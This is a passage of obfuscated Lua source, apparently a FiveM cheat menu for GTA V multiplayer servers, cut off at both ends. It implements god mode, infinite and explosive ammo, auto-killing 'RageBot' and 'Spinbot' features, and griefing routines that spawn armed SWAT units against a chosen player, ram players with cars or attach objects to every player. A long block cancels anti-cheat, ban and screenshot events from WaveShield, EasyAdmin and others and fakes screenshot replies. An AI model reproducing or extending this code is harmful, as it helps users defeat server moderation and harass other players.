                SetPedDensityMultiplierThisFrame(eB)
                SetScenarioPedDensityMultiplierThisFrame(eB, eB)
                DistantCopCarSirens(false)
                SetGarbageTrucks(false)
                SetRandomBoats(false)
                SetCreateRandomCops(false)
                SetCreateRandomCopsNotOnScenarios(false)
                SetCreateRandomCopsOnScenarios(false)
                local x, y, z =
                    d.Main.GuestTable.GuestUnPack(
                    GetEntityCoords(I.Guestdata.pLocalPlayer.pedId)
                )
                ClearAreaOfVehicles(x, y, z, 1000, false, false, false, false, false)
                RemoveVehiclesFromGeneratorsInArea(x - 500.0, y - 500.0, z - 500.0, x + 500.0, y + 500.0, z + 500.0)
            end
            if I.comboBoxes[3]._actual[eI] > 1 then
                d.Main.GuestAimMore.GuestSetVehicleEngineTorqueMultiplier(
                    GetVehiclePedIsIn(GetPlayerPed(-1), false),
                    I.comboBoxes[3]._actual[eI] + 0.0
                )
            end
            if I.comboBoxes[3]._actual[eH] > 1 then
                d.Main.GuestAimMore.GuestSetVehicleEnginePowerMultiplier(
                    GetVehiclePedIsIn(GetPlayerPed(-1), false),
                    I.comboBoxes[3]._actual[eH] + 1.0
                )
            end
            if I.OptionConfig.vehGodmode and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                SetEntityInvincible(I.Guestdata.pLocalPlayer.cVehicle, true)
            end
            if I.OptionConfig.GodmodeTires then
                SetVehicleTyresCanBurst(GetVehiclePedIsUsing(PlayerPedId()), true)
            else
                SetVehicleTyresCanBurst(GetVehiclePedIsUsing(PlayerPedId()), false)
            end
            if I.OptionConfig.BunnyHop and not IsPedInAnyVehicle(PlayerPedId()) then
                if IsDisabledControlPressed(1, A["SPACE"]) then
                    TaskJump(PlayerPedId(), true)
                    d.Main.GuestWait(200)
                end
            end
            if I.OptionConfig.SuperMan then
                GivePlayerRagdollControl(PlayerId(), true)
                SetPedCanRagdoll(PlayerPedId(), false)
                GiveDelayedWeaponToPed(PlayerPedId(), 0xFBAB5776, 1, 0)
                local gw, gx = IsControlPressed(0, A["SPACE"]), IsControlPressed(0, A["W"])
                if gw or gx then
                    if gw then
                        ApplyForceToEntity(
                            PlayerPedId(),
                            1,
                            0.0,
                            0.0,
                            9999999.0,
                            0.0,
                            0.0,
                            0.0,
                            true,
                            true,
                            true,
                            true,
                            false,
                            true
                        )
                    elseif IsEntityInAir(PlayerPedId()) then
                        ApplyForceToEntity(
                            PlayerPedId(),
                            1,
                            0.0,
                            9999999.0,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            true,
                            true,
                            true,
                            true,
                            false,
                            true
                        )
                    end
                    Wait(0)
                end
            else
                GivePlayerRagdollControl(PlayerId(), false)
                SetPedCanRagdoll(PlayerPedId(), true)
            end
            if I.OptionConfig.vehAlwaysWheelie then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1)) and
                        c2c74f255aa73c2253afc9ecc82InVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1)), -1) ==
                            GetPlayerPed(-1)
                 then
                    SetVehicleWheelieState(GetVehiclePedIsIn(GetPlayerPed(-1)), 129)
                end
            end
            if I.OptionConfig.vehRainbowCol then
                local rgb = I.NewFunction.sfvjdsqiofgjqdsofhqsziuhfhz(1.0)
                I.NewFunction.fhdfsqodjfgsh(I.Guestdata.pLocalPlayer.cVehicle)
                SetVehicleCustomPrimaryColour(
                    I.Guestdata.pLocalPlayer.cVehicle,
                    I.rgb.r,
                    I.rgb.g,
                    I.rgb.b
                )
                SetVehicleCustomSecondaryColour(
                    I.Guestdata.pLocalPlayer.cVehicle,
                    I.rgb.r,
                    I.rgb.g,
                    I.rgb.b
                )
            end
            if I.OptionConfig.vehRainbowLights then
                local rgb = I.NewFunction.sfvjdsqiofgjqdsofhqsziuhfhz(1.0)
                I.NewFunction.fhdfsqodjfgsh(I.Guestdata.pLocalPlayer.cVehicle)
                SetVehicleNeonLightsColour(
                    I.Guestdata.pLocalPlayer.cVehicle,
                    I.rgb.r,
                    I.rgb.g,
                    I.rgb.b
                )
                for b7 = 1, 12 do
                    SetVehicleHeadlightsColour(I.Guestdata.pLocalPlayer.cVehicle, b7)
                end
            end
            SetPedCanBeKnockedOffVehicle(
                I.Guestdata.pLocalPlayer.pedId,
                I.OptionConfig.vehNoFall
            )
            if I.OptionConfig.vehWallride then
                if
                    IsPedInVehicle(
                        I.Guestdata.pLocalPlayer.pedId,
                        GetVehiclePedIsIn(I.Guestdata.pLocalPlayer.pedId, true),
                        true
                    )
                 then
                    ApplyForceToEntity(
                        GetVehiclePedIsIn(I.Guestdata.pLocalPlayer.pedId, true),
                        1,
                        0,
                        0,
                        -0.4,
                        0,
                        0,
                        0,
                        1,
                        true,
                        true,
                        true,
                        true,
                        true
                    )
                end
            end
            if I.OptionConfig.teleShowCoords then
                x, y, z =
                    d.Main.GuestTable.GuestUnPack(
                    GetEntityCoords(GetPlayerPed(-1), true)
                )
                roundx =
                    d.Main.GuestToNum(string.format("%.2f", x))
                roundy =
                    d.Main.GuestToNum(string.format("%.2f", y))
                roundz =
                    d.Main.GuestToNum(string.format("%.2f", z))
                I.functions.e564abecb856e0385c2ecb46e4c6a2b8("~w~x: ~s~" .. roundx, 0.01, 0.04, I.mainColor)
                I.functions.e564abecb856e0385c2ecb46e4c6a2b8("~w~y: ~s~" .. roundy, 0.01, 0.06, I.mainColor)
                I.functions.e564abecb856e0385c2ecb46e4c6a2b8("~w~z: ~s~" .. roundz, 0.01, 0.08, I.mainColor)
            end
            if I.OptionConfig.visForceThirdperson then
                SetFollowPedCamViewMode(1)
            end
            if
                d.Main.GuestToNum(
                    F(I.OptionConfig.weaponsDamageMultiplierSet)
                )
             then
                d.Main.GuestAimMore.GuestSetPlayerWeaponDamageModifier(
                    PlayerId(),
                    d.Main.GuestToNum(
                        F(I.OptionConfig.weaponsDamageMultiplierSet)
                    )
                )
                d.Main.GuestAimMore.GuestSetPlayerMeleeWeaponDamageModifier(
                    PlayerId(),
                    d.Main.GuestToNum(
                        F(I.OptionConfig.weaponsDamageMultiplierSet)
                    )
                )
            end
            if I.OptionConfig.weapExplosiveAmmo then
                local gy, coords =
                    GetPedLastWeaponImpactCoord(I.Guestdata.pLocalPlayer.pedId)
                if gy then
                    I.natives.d5cb04ddaa81e3685adb07e123e0631(coords.x, coords.y, coords.z, 2, 100.0, true, false, 0)
                end
                SetExplosiveMeleeThisFrame(PlayerId())
            end
            if I.OptionConfig.InfAmmo then
                if IsPedShooting(PlayerPedId()) then
                    local gz, gA =
                        d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
                        PlayerPedId()
                    )
                    ammo = GetAmmoInPedWeapon(PlayerPedId(), gA)
                    SetPedAmmo(PlayerPedId(), gA, ammo + 1)
                end
            end
            if I.OptionConfig.weapCustomBullet then
                I.functions.customBullet()
            end
            if I.OptionConfig.weapTeleportGun then
                local gy, coords =
                    GetPedLastWeaponImpactCoord(I.Guestdata.pLocalPlayer.pedId)
                if gy then
                    I.functions.bd249ffd8df1cc2f86757331(coords.x, coords.y, coords.z + 3)
                end
            end
            if I.OptionConfig.weapRapidFire then
                I.functions.e2f78231b10c0c979c5b454af2028f()
            end
            if I.OptionConfig.weapNoReload then
                if IsPedShooting(PlayerPedId()) then
                    PedSkipNextReloading(PlayerPedId())
                    MakePedReload(PlayerPedId())
                end
            end
            if I.OptionConfig.BlockBlackScreen then
                DoScreenFadeIn(0)
            end
            if I.OptionConfig.RageBot then
                if IsDisabledControlPressed(0, 24) then
                    for h in EnumeratePeds() do
                        if h ~= PlayerPedId() then
                            d32b47862222b5ed81fd0457917(h)
                        end
                    end
                end
            end
            if I.OptionConfig.NoRecoil and IsDisabledControlPressed(0, 24) then
                local gB = GetGameplayCamRelativePitch()
                SetGameplayCamRelativePitch(gB, 0.0)
            end
            if I.OptionConfig.Tracers then
                local cd, gA =
                    d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
                    PlayerPedId()
                )
                if gA ~= -1569615261 then
                    local gC =
                        d.Main.GuestAimMore.GuestGetCurrentPedWeaponEntityIndex(
                        PlayerPedId()
                    )
                    local launchPos = GetEntityCoords(gC)
                    local bW = GetGameplayCamCoord() + lpdfiodsjqshudvazaerz(GetGameplayCamRot(2)) * 2000.0
                    if IsPedShooting(PlayerPedId()) then
                        Hit, ImpactCoord = GetPedLastWeaponImpactCoord(PlayerPedId())
                        LineToInsertOn = a952b5cc16ba63cf482ce(BulletCoords) + 1
                        Coords =
                            d.Main.GuestTable.GuestPack(
                            launchPos,
                            bW,
                            ImpactCoord
                        )
                        d.Main.GuestTable.GuestInsert(
                            BulletCoords,
                            LineToInsertOn,
                            Coords
                        )
                        ceb50bd5cac2e84(BulletCoords, 3 * 1000)
                    end
                end
                for b7 = 1, #BulletCoords do
                    CurBullet = BulletCoords[b7]
                    if CurBullet ~= nil then
                        launchPos = CurBullet[1]
                        TargetPos = CurBullet[2]
                        ImpactCoord = CurBullet[3]
                        Lx, Ly, Lz =
                            d.Main.GuestTable.GuestUnPack(
                            ImpactCoord
                        )
                        DrawMarker(
                            28,
                            ImpactCoord,
                            0,
                            0,
                            0,
                            0,
                            0,
                            0,
                            0.051,
                            0.051,
                            0.051,
                            I.rgb.r,
                            I.rgb.g,
                            I.rgb.b,
                            200,
                            0,
                            0,
                            0,
                            0
                        )
                        if Lx ~= 0.0 and Ly ~= 0.0 and Lz ~= 0.0 then
                            DrawLine(
                                launchPos.x,
                                launchPos.y,
                                launchPos.z,
                                ImpactCoord.x,
                                ImpactCoord.y,
                                ImpactCoord.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                        else
                            DrawLine(
                                launchPos.x,
                                launchPos.y,
                                launchPos.z,
                                TargetPos.x,
                                TargetPos.y,
                                TargetPos.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                        end
                    end
                end
            end
            if I.OptionConfig.Crosshair and not D then
                local gD, gE =
                    d.Main.GuestAimMore.GuestEntityPlayerIsFreeAimingAt(
                    PlayerId()
                )
                DrawRect2(I.ScreenWidth / 2 - 2, I.ScreenHeight / 2 - 7, 3, 13, 0, 0, 0, 255)
                DrawRect2(I.ScreenWidth / 2 - 7, I.ScreenHeight / 2 - 2, 13, 3, 0, 0, 0, 255)
                DrawRect2(I.ScreenWidth / 2 - 1, I.ScreenHeight / 2 - 6, 1, 11, 255, 255, 255, 255)
                DrawRect2(I.ScreenWidth / 2 - 6, I.ScreenHeight / 2 - 1, 11, 1, 255, 255, 255, 255)
            end
            if I.OptionConfig.Spinbot and not B then
                if GetEntityVelocity(PlayerPedId()) == vector3(0, 0, 0) then
                    SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 20)
                    for gF in EnumeratePeds() do
                        if
                            gF ~= PlayerPedId() and
                                d.Main.GuestAimMore.GuestHasEntityClearLosToEntityInFront(
                                    PlayerPedId(),
                                    gF
                                )
                         then
                            x, y, z =
                                d.Main.GuestTable.GuestUnPack(
                                GetEntityCoords(gF)
                            )
                            d.Main.GuestAimMore.GuestSetPedShootsAtCoord(
                                PlayerPedId(),
                                x,
                                y,
                                z,
                                true
                            )
                            d32b47862222b5ed81fd0457917(gF)
                        end
                    end
                end
            end
            if I.OptionConfig.f2ae7507d6c4ad587226368a01bd45d7 then
                for X in f79156a3ecec7e2fae4e99ae06a241f() do
                    NetworkRequestControlOfEntity(X)
                    ApplyForceToEntity(X, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
            end
            local function gG()
                local cn = {}
                for b7 = 1, GetNumResources() do
                    cn[b7] = GetResourceByFindIndex(b7)
                end
                return cn
            end
            AddEventHandler(
                "cmg3_animations:syncTarget",
                function(ck)
                    if I.ScriptyShitty.blocktakehostage then
                        TriggerEvent("cmg3_animations:cl_stop")
                    end
                end
            )
            AddEventHandler(
                "cmg3_animations:Me",
                function(ck)
                    if I.ScriptyShitty.blocktakehostage then
                        TriggerEvent("cmg3_animations:cl_stop")
                    end
                end
            )
            AddEventHandler(
                "CarryPeople:syncTarget",
                function(ck)
                    if I.ScriptyShitty.blocktakehostage then
                        TriggerEvent("CarryPeople:cl_stop")
                    end
                end
            )
            AddEventHandler(
                "CarryPeople:Me",
                function(ck)
                    if I.ScriptyShitty.blocktakehostage then
                        TriggerEvent("CarryPeople:cl_stop")
                    end
                end
            )
            RegisterNetEvent("fuhjizofzf4z5fza")
            AddEventHandler(
                "fuhjizofzf4z5fza",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("firstSpawnAC")
            AddEventHandler(
                "firstSpawnAC",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("GlobalCheat")
            AddEventHandler(
                "GlobalCheat",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("waveshieldbetterthanyounoob")
            AddEventHandler(
                "waveshieldbetterthanyounoob",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("waveshieldbetterthanyounoob")
            AddEventHandler(
                "waveshieldbetterthanyounoob",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("waveshieldbetterthanyounoob")
            AddEventHandler(
                "waveshieldbetterthanyounoob",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("ΑβΒγΓδΔεΕ")
            AddEventHandler(
                "ΑβΒγΓδΔεΕ",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("οΟπΠρΡσςΣτΤυΥφΦχΧ")
            AddEventHandler(
                "οΟπΠρΡσςΣτΤυΥφΦχΧ",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("mhacking:start")
            AddEventHandler(
                "mhacking:start",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("mhacking:hide")
            AddEventHandler(
                "mhacking:hide",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("mhacking:show")
            AddEventHandler(
                "mhacking:show",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("mhacking:setmessage")
            AddEventHandler(
                "mhacking:setmessage",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("cortana:AddLog")
            AddEventHandler(
                "cortana:AddLog",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("cortana:AddLog")
            AddEventHandler(
                "cortana:AddLog",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("WaveShield:UpdateClient")
            AddEventHandler(
                "WaveShield:UpdateClient",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("WaveShield:clearVehicles")
            AddEventHandler(
                "WaveShield:clearVehicles",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("WaveShield:delgun")
            AddEventHandler(
                "WaveShield:delgun",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("WaveShield:loadClient")
            AddEventHandler(
                "WaveShield:loadClient",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("UwU:scrambler-vac:triggeredClientEvent")
            AddEventHandler(
                "UwU:scrambler-vac:triggeredClientEvent",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("UwU:violateReport")
            AddEventHandler(
                "UwU:violateReport",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("UwU:scrambler-vac:triggeredClientEvent")
            AddEventHandler(
                "UwU:scrambler-vac:triggeredClientEvent",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("bay_ac:ban")
            AddEventHandler(
                "bay_ac:ban",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("ReportCheat")
            AddEventHandler(
                "ReportCheat",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("GetScreenshotFromUser")
            AddEventHandler(
                "GetScreenshotFromUser",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("kernioz:requestTokenAccess")
            AddEventHandler(
                "kernioz:requestTokenAccess",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("screenshot_basic:requestScreenshot")
            AddEventHandler(
                "screenshot_basic:requestScreenshot",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("EasyAdmin:CaptureScreenshot")
            AddEventHandler(
                "EasyAdmin:CaptureScreenshot",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("requestScreenshot")
            AddEventHandler(
                "requestScreenshot",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("__cfx_nui:screenshot_created")
            AddEventHandler(
                "__cfx_nui:screenshot_created",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("screenshot-basic")
            AddEventHandler(
                "screenshot-basic",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("requestScreenshotUpload")
            AddEventHandler(
                "requestScreenshotUpload",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("scrambler-vac:triggeredClientEvent")
            AddEventHandler(
                "scrambler-vac:triggeredClientEvent",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("myAcSuckYourAssholeHacker")
            AddEventHandler(
                "myAcSuckYourAssholeHacker",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("BanSql:ICheatClient")
            AddEventHandler(
                "BanSql:ICheatClient",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("detectionf748esf4esf4se85de7des7fesf5ede8sf")
            AddEventHandler(
                "detectionf748esf4esf4se85de7des7fesf5ede8sf",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("kakuhsdubhzuhbudzdz")
            AddEventHandler(
                "kakuhsdubhzuhbudzdz",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("maisweshcuntokenca")
            AddEventHandler(
                "maisweshcuntokenca",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("x_anticheat")
            AddEventHandler(
                "x_anticheat",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("ViolationDetected")
            AddEventHandler(
                "ViolationDetected",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("cheat")
            AddEventHandler(
                "cheat",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("ncpp")
            AddEventHandler(
                "ncpp",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("screenshot")
            AddEventHandler(
                "screenshot",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("antilynx")
            AddEventHandler(
                "antilynx",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("NWAC")
            AddEventHandler(
                "NWAC",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("foundyou")
            AddEventHandler(
                "foundyou",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("CarlosLR-AC")
            AddEventHandler(
                "CarlosLR-AC",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("AntiBlips")
            AddEventHandler(
                "AntiBlips",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("AntiSpectate")
            AddEventHandler(
                "AntiSpectate",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("anticheese")
            AddEventHandler(
                "anticheese",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("Choco:")
            AddEventHandler(
                "Choco:",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("globalAC:trigger")
            AddEventHandler(
                "globalAC:trigger",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("EasyAdmin:TookScreenshot")
            AddEventHandler(
                "EasyAdmin:TookScreenshot",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("venomadmin::openmenucheck")
            AddEventHandler(
                "venomadmin::openmenucheck",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("venomadmin::godmodecheck")
            AddEventHandler(
                "venomadmin::godmodecheck",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("venomadmin::freezeplayercheck")
            AddEventHandler(
                "venomadmin::freezeplayercheck",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("venomadmin::manageplayercheck")
            AddEventHandler(
                "venomadmin::manageplayercheck",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("venomadmin::invisibilitycheck")
            AddEventHandler(
                "venomadmin::invisibilitycheck",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("venomadmin::unbancheck")
            AddEventHandler(
                "venomadmin::unbancheck",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("venomadmin::banplayercheck")
            AddEventHandler(
                "venomadmin::banplayercheck",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("venomadmin::TakeScreenshot")
            AddEventHandler(
                "venomadmin::TakeScreenshot",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("venomadmin::TookScreenshot")
            AddEventHandler(
                "venomadmin::TookScreenshot",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("EasyAdmin:requestBanlist")
            AddEventHandler(
                "EasyAdmin:requestBanlist",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("EasyAdmin:requestSpectate")
            AddEventHandler(
                "EasyAdmin:requestSpectate",
                function()
                    CancelEvent()
                end
            )
            RegisterNetEvent("EasyAdmin:banPlayer")
            AddEventHandler(
                "EasyAdmin:banPlayer",
                function()
                    CancelEvent()
                end
            )
            AddEventHandler(
                "EasyAdmin:FreezePlayer",
                function(ad)
                    TriggerEvent("EasyAdmin:FreezePlayer", false)
                    CancelEvent()
                end
            )
            RegisterNetEvent("EasyAdmin:CaptureScreenshot")
            AddEventHandler(
                "EasyAdmin:CaptureScreenshot",
                function()
                    d.Main.GuestEvent(
                        "EasyAdmin:TookScreenshot",
                        "ERROR"
                    )
                    CancelEvent()
                end
            )
            RegisterNetEvent("EasyAdmin:TookScreenshot")
            AddEventHandler(
                "EasyAdmin:TookScreenshot",
                function()
                    d.Main.GuestEvent(
                        "EasyAdmin:TookScreenshot",
                        "ERROR"
                    )
                    CancelEvent()
                end
            )
            function SWATTeamPullUp(eU)
                for b7 = 1, 1 do
                    local K = GetPlayerPed(eU)
                    local coords = GetEntityCoords(K)
                    local bJ, x, y, z = GetClosestRoad(coords.x + 100.0, coords.y + 125.0, coords.z, 1, 1)
                    local gH = "s_m_y_swat_01"
                    local gI = "riot"
                    RequestModel(GetHashKey(gH))
                    RequestModel(GetHashKey(gI))
                    local gJ = 0
                    while not HasModelLoaded(GetHashKey(gH)) and not HasModelLoaded(GetHashKey(gI)) do
                        gJ = gJ + 1
                        d.Main.GuestWait(1)
                        if gJ > 10000 then
                            break
                        end
                    end
                    local gK = CreatePed(31, gH, x, y, z, 0.0, true, true)
                    local gL = CreatePed(31, gH, x, y, z, 0.0, true, true)
                    local gM = CreatePed(31, gH, x, y, z, 0.0, true, true)
                    local gN = CreatePed(31, gH, x, y, z, 0.0, true, true)
                    local veh = e087206cc908106f5b9548005fa39fd(GetHashKey(gI), x, y, z, GetEntityHeading(K), 1, 1)
                    SetVehicleSiren(veh, true)
                    ClearPedTasks(gK)
                    d6900ec9e918eb1426be32868e2b0(gK, "WEAPON_ASSAULTRIFLE", 9999, false, true)
                    d6900ec9e918eb1426be32868e2b0(gL, "WEAPON_ASSAULTRIFLE", 9999, false, true)
                    d6900ec9e918eb1426be32868e2b0(gM, "WEAPON_ASSAULTRIFLE", 9999, false, true)
                    d6900ec9e918eb1426be32868e2b0(gN, "WEAPON_MINIGUN", 9999, false, true)
                    if DoesEntityExist(veh) then
                        SetPedIntoVehicle(gK, veh, -1)
                        SetPedIntoVehicle(gL, veh, 0)
                        SetPedIntoVehicle(gM, veh, 1)
                        SetPedIntoVehicle(gN, veh, 2)
                    else
                        DeleteEntity(gK)
                        DeleteEntity(gL)
                        DeleteEntity(gM)
                        DeleteEntity(gN)
                        DeleteEntity(veh)
                    end
                    TaskVehicleDriveToCoord(
                        gK,
                        veh,
                        coords.x + 7 * b7,
                        coords.y + 7 * b7,
                        coords.z,
                        200.0,
                        40.0,
                        GetHashKey(veh),
                        6,
                        1.0,
                        true
                    )
                    TaskCombatPed(gL, GetPlayerPed(aT), true, true)
                    TaskCombatPed(gM, GetPlayerPed(aT), true, true)
                    TaskCombatPed(gN, GetPlayerPed(aT), true, true)
                    SetRelationshipBetweenGroups(5, GetHashKey(K), GetHashKey(gK))
                    SetRelationshipBetweenGroups(5, GetHashKey(gK), GetHashKey(K))
                    SetRelationshipBetweenGroups(5, GetHashKey(K), GetHashKey(gL))
                    SetRelationshipBetweenGroups(5, GetHashKey(gL), GetHashKey(K))
                    SetRelationshipBetweenGroups(5, GetHashKey(K), GetHashKey(gK))
                    SetRelationshipBetweenGroups(5, GetHashKey(gM), GetHashKey(K))
                    SetRelationshipBetweenGroups(5, GetHashKey(K), GetHashKey(gM))
                    SetRelationshipBetweenGroups(5, GetHashKey(gN), GetHashKey(K))
                    SetRelationshipBetweenGroups(5, GetHashKey(K), GetHashKey(gN))
                    SetPedKeepTask(gK, true)
                    SetPedKeepTask(gL, true)
                    SetPedKeepTask(gM, true)
                    SetPedKeepTask(gN, true)
                    SetVehicleOnGroundProperly(veh)
                end
            end
            function ac7027e349e80aef48819f0ee25ef9(eU)
                local model = "sultan"
                local gO = 0
                while not HasModelLoaded(GetHashKey(model)) and gO < 5000 do
                    gO = gO + 1
                    RequestModel(GetHashKey(model))
                    Wait(0)
                end
                local coords = GetEntityCoords(GetPlayerPed(eU))
                local gP = CreateVehicle(GetHashKey(model), coords.x + 10, coords.y, coords.z, 0.0, 1, 1)
                SetEntityHeading(gP, 90.0)
                if DoesEntityExist(gP) then
                    ApplyForceToEntity(gP, 1, -5000.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                else
                    SetEntityCoords(gP, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, false)
                end
                Wait(150)
                local gQ = CreateVehicle(GetHashKey(model), coords.x + 10, coords.y, coords.z, 0.0, 1, 1)
                SetEntityHeading(gQ, 90.0)
                if DoesEntityExist(gQ) then
                    ApplyForceToEntity(gQ, 1, -5000.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                else
                    SetEntityCoords(gQ, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, false)
                end
            end
            function RequestModelSync(gR)
                local gS = GetHashKey(gR)
                RequestModel(gS)
                while not HasModelLoaded(gS) do
                    RequestModel(gS)
                    d.Main.GuestWait(0)
                end
            end
            function ad0a8b371fe68843d8e52c3d8d9b8c()
                d.Main.GuestThread(
                    function()
                        for b7 = 0, 128 do
                            local gT = CreateObject(GetHashKey("prop_beach_fire "), 0, 0, 0, true, true, true)
                            local gU = CreateObject(GetHashKey("prop_rock_4_big2"), 0, 0, 0, true, true, true)
                            local gV = CreateObject(GetHashKey("prop_beachflag_le"), 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                gT,
                                GetPlayerPed(b7),
                                GetPedBoneIndex(GetPlayerPed(b7), 57005),
                                0.4,
                                0,
                                0,
                                0,
                                270.0,
                                60.0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                            AttachEntityToEntity(
                                gU,
                                GetPlayerPed(b7),
                                GetPedBoneIndex(GetPlayerPed(b7), 57005),
                                0.4,
                                0,
                                0,
                                0,
                                270.0,
                                60.0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                            AttachEntityToEntity(
                                gV,
                                GetPlayerPed(b7),
                                GetPedBoneIndex(GetPlayerPed(b7), 57005),
                                0.4,
                                0,
                                0,
                                0,
                                270.0,
                                60.0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
                )
            end
            function bbe679b6dacb3e2016befe41e2f494f1()
                if not IsPedInAnyVehicle(PlayerPedId(), true) then
                    ClearPedTasksImmediately(PlayerPedId())
                end
                d.Main.GuestThread(
                    function()
                        B = not B
                        if not B then
                            local X = GetVehiclePedIsIn(PlayerPedId())
                            SetEntityCollision(X, true, true)
                            SetEntityLocallyVisible(PlayerPedId())
                            SetEntityCollision(PlayerPedId(), true, true)
                            d.Main.GuestAimMore.GuestResetEntityAlpha(
                                PlayerPedId()
                            )
                            FreezeEntityPosition(PlayerPedId(), false)
                            FreezeEntityPosition(X, false)
                            d.Main.GuestAimMore.GuestResetEntityAlpha(
                                X
                            )
                            DisableControlAction(0, 85, false)
                        end
                        while B and not killmenu do
                            DisableControlAction(0, 85, true)
                            if IsPedInAnyVehicle(PlayerPedId(), true) then
                                local X = GetVehiclePedIsIn(PlayerPedId())
                                local af = GetEntityHeading(X)
                                SetEntityCollision(X, false, false)
                                FreezeEntityPosition(X, true)
                                if IsDisabledControlPressed(0, 32) then
                                    local coords = GetOffsetFromEntityInWorldCoords(X, 0.0, C, 0.0)
                                    local z = GetEntityCoords(X).z
                                    c3188c79a068242c231f422e25ebbae(
                                        X,
                                        coords.x,
                                        coords.y,
                                        z - 0.55,
                                        0.0,
                                        0.0,
                                        0.0,
                                        false
                                    )
                                end
                                if IsDisabledControlPressed(0, 31) then
                                    local coords = GetOffsetFromEntityInWorldCoords(X, 0.0, -C, 0.0)
                                    local z = GetEntityCoords(X).z
                                    c3188c79a068242c231f422e25ebbae(
                                        X,
                                        coords.x,
                                        coords.y,
                                        z - 0.55,
                                        0.0,
                                        0.0,
                                        0.0,
                                        false
                                    )
                                end
                                if IsDisabledControlPressed(0, 34) then
                                    SetEntityHeading(X, af + 2)
                                end
                                if IsDisabledControlPressed(0, 30) then
                                    SetEntityHeading(X, af - 2)
                                end
                                if IsDisabledControlPressed(0, 20) then
                                    local coords = GetEntityCoords(X)
                                    c3188c79a068242c231f422e25ebbae(
                                        X,
                                        coords.x,
                                        coords.y,
                                        coords.z - C * 2,
                                        0.0,
                                        0.0,
                                        0.0,
                                        false
                                    )
                                end
                                if IsDisabledControlPressed(0, 44) then
                                    local coords = GetEntityCoords(X)
                                    c3188c79a068242c231f422e25ebbae(
                                        X,
                                        coords.x,
